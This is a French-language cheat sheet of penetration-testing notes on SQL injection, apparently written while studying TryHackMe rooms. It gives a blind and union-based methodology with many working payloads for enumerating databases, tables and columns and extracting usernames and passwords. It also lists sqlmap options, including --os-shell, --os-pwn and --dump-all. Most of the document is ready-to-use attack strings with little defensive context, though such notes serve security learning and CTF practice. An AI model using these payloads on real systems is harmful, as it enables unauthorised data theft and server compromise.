## SQL Injections

[suIP.biz](https://suip.biz/?act=sqlmap) propose un SQLmap en ligne pour faire
une première audite d'une appli.

[Damn Small SQLi Scanner](https://github.com/stamparm/DSSS) est une sorte de
mini sqlmap écrit en python en moins de 100 lignes de codes mais qui est très
pratique dans un environnement réstreint.

Les champs suivant sont utiles à extraires : 

* `database()`
* `user()`
* `@@version`
* `username`
* `password`
* `table_name`
* `column_name`

Il faut toujours tester à la main les choses les plus simples au cas ou: 
`admin' --`. Pour des tests plus complets, on peut utiliser les payload suivant:

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
* [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

Ce [cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
est une bonne référence sur les injections SQL.

A la fin de [la room sqlibasics](https://tryhackme.com/room/sqlibasics) sur 
tryhackme il y à plein d'idée de trucs pour aller plus loin.

### Méthodologie blind (boolean or time-based)

Trouver le nombre de colones

```
admin123' UNION SELECT 1,2,3;--
```

Chercher les bases de données existantes

```
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
```

Chercher les tables de la base de donnée

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

Chercher les colones de la table trouvée

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

Chercher les entrée intéressantes de la DB

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

### SQLmap

C'est l'outil de référence. Il ne faut pas perdre de temps et utiliser
absolument sqlmap si je découvre une injection possible. ([sqlmap cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet))

Arguments intéressants:

* `--dbs` : list les databases
* `--dump & --dump-all` : Dump (retrieve) DBMS database
* `--os-shell` : Prompt for an interactive operating system shell
* `--batch` : Never ask for user input, use the default behavior
* `--dbms` : Provide back-end DBMS to exploit (i.e MySQL, PostgreSQL)
* `--passwords` : Enumerate DBMS users password hashes
* `--os-pwn` : Prompt for an OOB shell, Meterpreter or VNC
* `--wizard` : Simple wizard interface for beginner users
* `--level=LEVEL` : Level of tests to perform (1-5)
* `--risk=RISK` : Risk of tests to perform (1-3)
* `--all` : Retrieve everything

Exemple d'execution de base:

```bash
sqlmap --url "..." --batch
```

### Boolean based

Le résultat de la requête ne peut être que binaire. On à donc beaucoup moins
d'infos, aucune erreur n'est retourné.

Méthodologie:

1. Identifier un cas nominal (payload qui marche normalement, résultat = 1)
2. Faire une expression SQL simple qui casse le fonctionnement (résultat = 0)
3. Faire fonctionner le payload simple mais avec du SQL: preuve d'exploitabilité
4. Extraire des choses en répondant à des questions vrais/faux

**Exemple: extraire le nom de la DB**

* `substr((select database()),1,1)` donne le premier char du nom d'une db
* `ascii(char)` transforme un caractère en son code ascii

Le payload suivant va nous dire si la première lettre est un `a`:

```txt
1' AND (ascii(substr((select database()),1,1))) = 97 --+
```

On peut utiliser du les opérateurs `>` et `<` pour trouver les lettre en un
minimum de requettes possible. Il suffit de faire un pas à pas pour trouver les
bonnes lettre (sqlmap le fait aussi très bien mais on peut peut être faire
mieux, cela serait intéressant de le tester en python).

### Union based

Type d'injection SQL qui nous permettent d'utiliser le symbol `UNION` et donc
d'injecter le résultat d'une toute nouvelle requête dans la requête d'origine.

1. Trouver le point de vulnérabilité et provoquer une erreur
2. Essayer de comprendre ce qui à échouer et reconstruire la requête
3. Identifier si la requête est sensible aux `UNION ALL SELECT 'poc'`
4. Définir les tables qu'on vise
5. Définir le nb de champs
6. Extraire la donnée

Attention, il ne faut pas oublier d'encoder les requettes en url :

```
%27+UNION+SELECT+password,username+FROM+users+--
```

Exemple d'un payload utile pour récupérer la liste des champs d'une table:

```sql
UNION ALL SELECT 									/* pour une UNION SQLI */
	group_concat(column_name)				/* récupère la liste de tout les champs */
	,null,null,null,null 						/* met un null pour chaque champ: évite les erreurs */
	FROM information_schema.columns	/* une table système comportant des infos */
	WHERE table_name="people"				/* la table cible */
```

Minifié :

```sql
UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

#### Déterminer le nombres de colones

Technique des ORDER BY (une erreur = n-1):

```txt
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on until an error occurs
```

Technique des null (pas d'erreurs = bon nombre):

```txt
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# until no error occurs
```

#### Déterminer le type de la colone

Pas d'erruer = type ok:

```txt
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Sources

Tryhackme propose un super guide méthodologique pour reconstruire des injections
sql complexes (https://tryhackme.com/room/sqlinjectionlm)

